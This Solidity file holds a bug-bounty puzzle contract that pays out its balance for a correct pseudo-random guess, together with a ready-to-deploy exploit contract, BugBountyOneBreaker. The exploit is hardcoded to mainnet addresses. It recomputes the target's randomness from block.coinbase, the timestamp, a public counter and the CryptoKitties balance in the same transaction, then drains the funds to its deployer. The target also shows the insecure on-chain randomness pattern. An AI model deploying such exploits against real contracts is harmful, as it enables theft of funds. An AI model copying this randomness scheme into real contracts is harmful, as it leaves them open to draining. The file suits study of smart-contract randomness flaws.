/**
___________    _________        .____________  ____  __.
\__    ___/___ \_   ___ \  _____|   \_   ___ \|    |/ _|
  |    | /  _ \/    \  \/ /  ___/   /    \  \/|      <  
  |    |(  <_> )     \____\___ \|   \     \___|    |  \ 
  |____| \____/ \______  /____  >___|\______  /____|__ \
                       \/     \/            \/        \/
*/

pragma solidity ^0.4.21;

contract BugBountyOneBreaker {
	function BugBountyOneBreaker() public payable {
	    secretHolder s = secretHolder(0x7C4932FccC78d5d9e0E04AB65532c4eA20357890);
        BugBountyOne bb = BugBountyOne(0x976Ec8136C990751410108e4B3f57d65183D80EA);
	    
	    uint secret = s.getSecret()+1;
	    uint guess = _prand(secret);
	    bb.authorizeAddress.value(10 finney)(this);
	    bb.drainMe.value(1 finney)(guess);
	    msg.sender.transfer(address(this).balance);
	}

    function _prand(uint s) private returns (uint) {
        address CryptoKitties = 0x06012c8cf97BEaD5deAe237070F9587f8E7A266d;
        
        uint seed1 = s;
        uint seed2 = uint(block.coinbase); // Get Miner&#39;s Address
        uint seed3 = now; // Get the timestamp
        uint seed4 = CryptoKitties.balance;
        uint rand = uint(keccak256(seed1, seed2, seed3, seed4));
	    return rand;
    }
}

contract secretHolder {
    uint secret;
    function getSecret() public view returns(uint) {
        return secret++;
    }
}

contract BugBountyOne {

    mapping(address => bool) public authorizedToDrain;
    mapping(address => bool) public notAllowedToDrain;
    address public TechnicalRise; // TechnicalRise is not allowed to drain
    address public CryptoKitties = 0x06012c8cf97BEaD5deAe237070F9587f8E7A266d;
    uint private secretSeed;
    secretHolder private s = new secretHolder();

	function BugBountyOne() public {
	    TechnicalRise = msg.sender;
	    notAllowedToDrain[TechnicalRise] = true;
	    secretSeed = uint(keccak256(now, block.coinbase));
	}
	
	function drainMe(uint _guess) public payable {
        if(notAllowedToDrain[msg.sender]) return;

        if(authorizedToDrain[msg.sender] && msg.value >= 1 finney && _guess == _prand()) {
            TechnicalRise.transfer(address(this).balance / 20);
            msg.sender.transfer(address(this).balance);
            notAllowedToDrain[msg.sender] = true;
        }
    }
    
    function _prand() private returns (uint) {
        uint seed1 = s.getSecret();
        uint seed2 = uint(block.coinbase); // Get Miner&#39;s Address
        uint seed3 = now; // Get the timestamp
        uint seed4 = CryptoKitties.balance;
        uint rand = uint(keccak256(seed1, seed2, seed3, seed4));
        seed1 = secretSeed;
	    return rand;
    }
    
    function authorizeAddress(address _addr) public payable {
        if(msg.value >= 10 finney) {
            authorizedToDrain[_addr] = true;
        }
    }
    
    function () public payable {
        if(msg.value >= 10 finney) {
            authorizedToDrain[msg.sender] = true;
        }
    }
}